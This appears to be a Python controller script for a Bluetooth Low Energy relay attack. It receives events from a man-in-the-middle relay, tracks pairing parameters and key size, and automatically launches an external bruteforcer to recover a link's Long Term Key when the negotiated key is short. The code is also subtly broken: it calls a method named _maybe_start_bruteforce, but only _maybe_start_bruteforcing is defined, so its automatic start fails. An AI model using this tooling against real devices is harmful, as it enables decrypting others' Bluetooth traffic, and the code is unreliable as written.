#!/usr/bin/env python3
import argparse
import json
import socket
import threading
import subprocess
import time
from dataclasses import dataclass, field
from pathlib import Path
from typing import Optional, Literal

# =========================
# Data model
# =========================

@dataclass
class DeviceInfo:
    addr: str
    addr_type: str   # "public", "random_static", "random_rpa", "unknown"
    role: str        # "central" or "peripheral"


@dataclass
class SecurityInfo:
    pairing_mode: str = "unknown"       # "legacy", "le_sc", "unknown"
    key_size_bytes: Optional[int] = None
    entropy_bits: Optional[int] = None

    auth_req: Optional[int] = None
    sc: bool = False
    mitm: bool = False
    bonding: bool = False

    dhkey_check_seen: bool = False
    skd_known: bool = False
    iv_known: bool = False

    bruteforce_mode: str = "offline"    # "online", "offline", "disabled"
    ltk_status: str = "unknown"         # "unknown", "pending", "found"


@dataclass
class BruteForceInfo:
    exp_dir: Optional[str] = None
    attack_data_ready: bool = False
    process_running: bool = False
    last_result_path: Optional[str] = None


@dataclass
class LinkReport:
    central: Optional[DeviceInfo] = None
    peripheral: Optional[DeviceInfo] = None

    conn_interval_ms: Optional[float] = None
    slave_latency: Optional[int] = None
    supervision_timeout_ms: Optional[int] = None

    security: SecurityInfo = field(default_factory=SecurityInfo)
    bruteforce: BruteForceInfo = field(default_factory=BruteForceInfo)


# =========================
# Manager
# =========================

class Manager:
    """
    Manager that:
      - receives JSON events over TCP from the relay master,
      - tracks link security info,
      - automatically starts bruteforcer if key_size_bytes < threshold,
      - prints a security report on changes.
    """

    def __init__(self, bruteforcer_bin: Path, entropy_threshold_bytes: int):
        self.bruteforcer_bin = bruteforcer_bin
        self.entropy_threshold_bytes = entropy_threshold_bytes
        self.report = LinkReport()
        self._lock = threading.Lock()
        self._brute_proc: Optional[subprocess.Popen] = None

    # ===== public entrypoints =====

    def handle_event(self, ev: dict):
        """
        Called by the TCP listener when a JSON event is received.
        Expected event types (you can extend this):
          - "link_devices": basic addresses / types
          - "pairing_params": SMP pairing info (key size, authReq, sc/mitm/bonding)
          - "pairing_complete": when Pairing DHKey Check (0x0D) is seen
          - "enc_material": SKD/IV status
          - "attack_data_ready": when attack_data.bin is written
        """
        t = ev.get("type")
        updated_security = False

        with self._lock:
            if t == "link_devices":
                self._on_link_devices(ev)
                # not strictly "security", but nice to reprint overview
                updated_security = True

            elif t == "pairing_params":
                self._on_pairing_params(ev)
                updated_security = True

            elif t == "pairing_complete":
                self._on_pairing_complete(ev)
                updated_security = True

            elif t == "enc_material":
                self._on_enc_material(ev)
                updated_security = True

            elif t == "attack_data_ready":
                self._on_attack_data_ready(ev)
                updated_security = True

            # you can add more event types here if needed

            if updated_security:
                # maybe start bruteforcer if conditions are met
                self._maybe_start_bruteforce()
                # print updated report
                self.print_security_report()

    def poll_bruteforce(self):
        """
        Called periodically from main loop to check bruteforcer process.
        """
        with self._lock:
            if not self.report.bruteforce.process_running or self._brute_proc is None:
                return

            rc = self._brute_proc.poll()
            if rc is None:
                return  # still running

            self.report.bruteforce.process_running = False

            if rc != 0:
                print(f"[MANAGER] Bruteforcer exited with code {rc}")
                self.report.security.ltk_status = "unknown"
                self._brute_proc = None
                self.print_security_report()
                return

            # On success, expect an ltk.bin in exp_dir
            exp_dir = Path(self.report.bruteforce.exp_dir or ".")
            ltk_path = exp_dir / "ltk.bin"
            if ltk_path.exists():
                self.report.security.ltk_status = "found"
                self.report.bruteforce.last_result_path = str(ltk_path)
                print(f"[MANAGER] LTK found at {ltk_path}")
            else:
                print("[MANAGER] Bruteforcer finished but no ltk.bin found")
                self.report.security.ltk_status = "unknown"

            self._brute_proc = None
            self.print_security_report()

    # ===== event handlers =====

    def _on_link_devices(self, ev: dict):
        """
        Example event shape:
          {
            "type": "link_devices",
            "central_addr": "AA:BB:CC:DD:EE:FF",
            "central_addr_type": "public",
            "periph_addr": "11:22:33:44:55:66",
            "periph_addr_type": "random_static"
          }
        """
        ca = ev.get("central_addr")
        pa = ev.get("periph_addr")
        cat = ev.get("central_addr_type", "unknown")
        pat = ev.get("periph_addr_type", "unknown")

        if ca:
            self.report.central = DeviceInfo(addr=ca, addr_type=cat, role="central")
        if pa:
            self.report.peripheral = DeviceInfo(addr=pa, addr_type=pat, role="peripheral")

    def _on_pairing_params(self, ev: dict):
        """
        Example event shape (from relay master):
          {
            "type": "pairing_params",
            "key_size_bytes": 4,
            "auth_req": 0x29,
            "sc": true,
            "mitm": false,
            "bonding": true
          }
        """
        s = self.report.security
        ksz = ev.get("key_size_bytes")
        if isinstance(ksz, int):
            s.key_size_bytes = ksz
            s.entropy_bits = 8 * ksz

        s.auth_req = ev.get("auth_req")
        s.sc = bool(ev.get("sc", False))
        s.mitm = bool(ev.get("mitm", False))
        s.bonding = bool(ev.get("bonding", False))
        s.pairing_mode = "le_sc" if s.sc else "legacy"

        # Choose bruteforce mode: "online" if below threshold
        if s.key_size_bytes is not None and s.key_size_bytes < self.entropy_threshold_bytes:
            s.bruteforce_mode = "online"
        else:
            s.bruteforce_mode = "offline"

    def _on_pairing_complete(self, ev: dict):
        """
        Example event shape:
          {
            "type": "pairing_complete",
            "direction": "PtoC"
          }
        Called when SMP Pairing DHKey Check (0x0D) is seen.
        """
        self.report.security.dhkey_check_seen = True

    def _on_enc_material(self, ev: dict):
        """
        Example event shape:
          {
            "type": "enc_material",
            "skd_known": true,
            "iv_known": true
          }
        """
        s = self.report.security
        if "skd_known" in ev:
            s.skd_known = bool(ev["skd_known"])
        if "iv_known" in ev:
            s.iv_known = bool(ev["iv_known"])

    def _on_attack_data_ready(self, ev: dict):
        """
        Example event shape:
          {
            "type": "attack_data_ready",
            "exp_dir": "experiments/2025-12-05T1400",
            "attack_path": "experiments/2025-12-05T1400/attack_data.bin",
            "key_size_bytes": 4
          }
        """
        b = self.report.bruteforce
        s = self.report.security

        exp_dir = ev.get("exp_dir")
        if exp_dir:
            b.exp_dir = exp_dir

        b.attack_data_ready = True

        ksz = ev.get("key_size_bytes")
        if isinstance(ksz, int):
            s.key_size_bytes = ksz
            s.entropy_bits = 8 * ksz

        # mode might be updated here as well (if relay only knows key size now)
        if s.key_size_bytes is not None and s.key_size_bytes < self.entropy_threshold_bytes:
            s.bruteforce_mode = "online"
        else:
            s.bruteforce_mode = "offline"

    # ===== bruteforcer control =====

    def _maybe_start_bruteforcing_conditions(self) -> bool:
        """
        Returns True if we should start the bruteforcer now.
        """
        s = self.report.security
        b = self.report.bruteforce

        if s.bruteforce_mode != "online":
            return False
        if b.process_running:
            return False
        if not b.attack_data_ready:
            return False
        if not s.dhkey_check_seen:
            return False  # wait until pairing really finished
        if s.key_size_bytes is None:
            return False
        if s.key_size_bytes >= self.entropy_threshold_bytes:
            return False

        if b.exp_dir is None:
            print("[MANAGER] Cannot start bruteforcer: exp_dir unknown")
            return False

        return True

    def _maybe_start_bruteforcing(self):
        if self._maybe_start_bruteforcing_conditions():
            self._start_bruteforcer()

    def _start_bruteforcer(self):
        b = self.report.bruteforce
        s = self.report.security

        exp_dir = Path(b.exp_dir)
        attack_path = exp_dir / "attack_data.bin"

        if not attack_path.exists():
            print(f"[MANAGER] attack_data.bin not found at {attack_path}, not starting bruteforcer")
            return

        cmd = [str(self.bruteforcer_bin), str(attack_path)]

        print(f"[MANAGER] Starting bruteforcer: {' '.join(cmd)}")
        try:
            self._brute_proc = subprocess.Popen(cmd, cwd=str(exp_dir))
        except Exception as e:
            print(f"[MANAGER] Failed to start bruteforcer: {e}")
            return

        b.process_running = True
        s.ltk_status = "pending"

    # ===== pretty printing =====

    def _fmt_addr(self, dev: Optional[DeviceInfo]) -> str:
        if dev is None:
            return "unknown"
        return f"{dev.addr} ({dev.addr_type}, {dev.role})"

    def print_security_report(self):
        s = self.report.security
        b = self.report.bruteforce

        print("\n=== Link Overview ===")
        print(f"Central:    {self._fmt_addr(self.report.central)}")
        print(f"Peripheral: {self._fmt_addr(self.report.peripheral)}")

        if self.report.conn_interval_ms is not None:
            print(f"Interval:   {self.report.conn_interval_ms:.1f} ms")
        if self.report.slave_latency is not None:
            print(f"Latency:    {self.report.slave_latency}")
        if self.report.supervision_timeout_ms is not None:
            print(f"Timeout:    {self.report.supervision_timeout_ms} ms")

        print("\n=== Security ===")
        print(f"Pairing mode:        {s.pairing_mode}")
        if s.key_size_bytes is not None:
            print(f"Key size (bytes):    {s.key_size_bytes}")
            if s.entropy_bits is not None:
                print(f"Entropy:            ~{s.entropy_bits} bits")
        else:
            print("Key size (bytes):    unknown")

        if s.auth_req is not None:
            print(f"AuthReq:            0x{s.auth_req:02x}")

        print(f"LE Secure Conn:      {s.sc}")
        print(f"MITM protection:     {s.mitm}")
        print(f"Bonding:             {s.bonding}")
        print(f"DHKey Check seen:    {s.dhkey_check_seen}")
        print(f"SKD known:           {s.skd_known}")
        print(f"IV known:            {s.iv_known}")

        print("\n=== Bruteforce ===")
        print(f"Bruteforce mode:     {s.bruteforce_mode}")
        print(f"LTK status:          {s.ltk_status}")
        print(f"Exp dir:             {b.exp_dir}")
        print(f"Attack data ready:   {b.attack_data_ready}")
        print(f"Bruteforcer running: {b.process_running}")
        print(f"Last LTK path:       {b.last_result_path}")
        print("")


# =========================
# TCP Listener for events
# =========================

def event_listener(host: str, port: int, manager: Manager):
    """
    Simple TCP server that accepts one or more connections.
    Each line is expected to be a JSON object (event).
    """
    srv = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    srv.bind((host, port))
    srv.listen(5)

    print(f"[MANAGER] Listening for events on {host}:{port}")

    while True:
        conn, addr = srv.accept()
        print(f"[MANAGER] New connection from {addr}")
        t = threading.Thread(target=handle_client, args=(conn, manager), daemon=True)
        t.start()


def handle_client(conn: socket.socket, manager: Manager):
    with conn:
        buff = b""
        while True:
            try:
                data = conn.recv(4096)
            except OSError:
                break
            if not data:
                break
            buff += data
            while b"\n" in buff:
                line, buff = buff.split(b"\n", 1)
                line = line.strip()
                if not line:
                    continue
                try:
                    ev = json.loads(line.decode("utf-8"))
                except json.JSONDecodeError as e:
                    print(f"[MANAGER] JSON decode error: {e} on line: {line!r}")
                    continue
                manager.handle_event(ev)


# =========================
# Main
# =========================

def main():
    parser = argparse.ArgumentParser(
        description="NIMBLE Manager: auto online bruteforcing + security overview"
    )
    parser.add_argument(
        "--host", default="127.0.0.1",
        help="Host to listen for relay-master events (default: 127.0.0.1)"
    )
    parser.add_argument(
        "--port", type=int, default=9000,
        help="Port to listen for relay-master events (default: 9000)"
    )
    parser.add_argument(
        "--bruteforcer-bin", required=True,
        help="Path to bruteforcer binary (e.g. ./bruteforcer_ltk)"
    )
    parser.add_argument(
        "--entropy-threshold-bytes", type=int, default=5,
        help="Start online bruteforcing automatically if key_size_bytes < this (default: 5)"
    )
    args = parser.parse_args()

    manager = Manager(
        bruteforcer_bin=Path(args.bruteforcer_bin),
        entropy_threshold_bytes=args.entropy_threshold_bytes,
    )

    # Start TCP listener thread
    t = threading.Thread(
        target=event_listener,
        args=(args.host, args.port, manager),
        daemon=True,
    )
    t.start()

    # Main loop: poll bruteforcer status
    try:
        while True:
            manager.poll_bruteforce()
            time.sleep(0.5)
    except KeyboardInterrupt:
        print("\n[MANAGER] Shutting down.")


if __name__ == "__main__":
    main()
